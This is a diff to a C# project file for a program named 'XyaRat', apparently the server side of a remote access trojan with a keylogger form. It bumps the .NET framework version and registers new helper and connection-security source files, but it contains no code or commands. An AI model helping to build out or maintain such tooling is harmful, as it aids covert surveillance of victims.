@@ -9,7 +9,7 @@
     <OutputType>WinExe</OutputType>
     <RootNamespace>Server</RootNamespace>
     <AssemblyName>XyaRat</AssemblyName>
-    <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <Deterministic>true</Deterministic>
     <TargetFrameworkProfile />
@@ -246,6 +246,8 @@
       <DependentUpon>FormKeylogger.cs</DependentUpon>
     </Compile>
     <Compile Include="Helper\Logger.cs" />
+    <Compile Include="Helper\CertificateManager.cs" />
+    <Compile Include="Helper\TrafficDeobfuscator.cs" />
     <Compile Include="Forms\FormPorts.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -366,6 +368,10 @@
     <Compile Include="Settings.cs" />
     <Compile Include="Connection\Clients.cs" />
     <Compile Include="Connection\Listener.cs" />
+    <Compile Include="Security\SecurityManager.cs" />
+    <Compile Include="Security\RateLimiter.cs" />
+    <Compile Include="Security\IpWhitelist.cs" />
+    <Compile Include="Security\ConnectionThrottle.cs" />
     <Compile Include="StreamLibrary\Enums.cs" />
     <Compile Include="StreamLibrary\IUnsafeCodec.cs" />
     <Compile Include="StreamLibrary\IVideoCodec.cs" />
